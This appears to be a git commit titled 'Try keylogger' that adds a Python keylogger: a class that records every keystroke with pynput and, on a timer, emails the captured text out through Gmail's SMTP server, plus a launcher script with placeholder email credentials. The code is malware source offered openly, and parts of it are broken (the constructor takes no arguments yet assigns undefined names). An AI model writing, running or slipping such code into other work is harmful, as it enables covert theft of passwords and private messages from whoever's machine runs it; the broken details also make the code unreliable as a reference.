c1bcc5d42f8c0feb589e2a1b1b6d820d74a32552
Kishore2071 <kishorekumarsaran2001@gmail.com>
2024-03-18 18:02:34 +0530

    Try keylogger

---
+++ Cyber Tools/keylogger/alogger.py
@@ -0,0 +1,4 @@
+import keylogger
+
+my_keylogger=keylogger.Keylogger(20,"example123@gmail.com","Password123")
+my_keylogger.start()
---
+++ Cyber Tools/keylogger/keylogger.py
@@ -0,0 +1,45 @@
+import pynput.keyboard
+import threading
+import smtplib
+# stored_keys = ""
+
+
+class Keylogger:
+    
+    def __init__(self):
+        self.stored_keys = ""
+        self.time = time
+        self.email = email
+        self.password = password
+        
+    def log(self,string):
+        self.stored_keys = self.stored_keys + string
+    
+    def key_press(self,key):
+        try:
+            current_key = str(key.char)
+        except AttributeError:
+            if key == key.space:
+                current_key = " "
+            else:
+                current_key = " " + str(key) + " "
+        self.log(current_key)
+    
+    def send_mail(self,email,password,message):
+        server = smtplib.SMTP("smtp.gmail.com",587)
+        server.starttls()
+        server.login(email,password)
+        server.sendmail(email,email,message)
+        server.quit()        
+    
+    def report(self):
+        self.send_mail(self.email,self.password,self.stored_keys)
+        self.stored_keys = " "
+        timer = threading.Timer(5,self.report)
+        timer.start()
+        
+    def start(self):
+        keyboard_listener = pynput.keyboard.Listener(on_press=self.key_press)
+        with keyboard_listener as Listener:
+            self.report()
+            Listener.join()
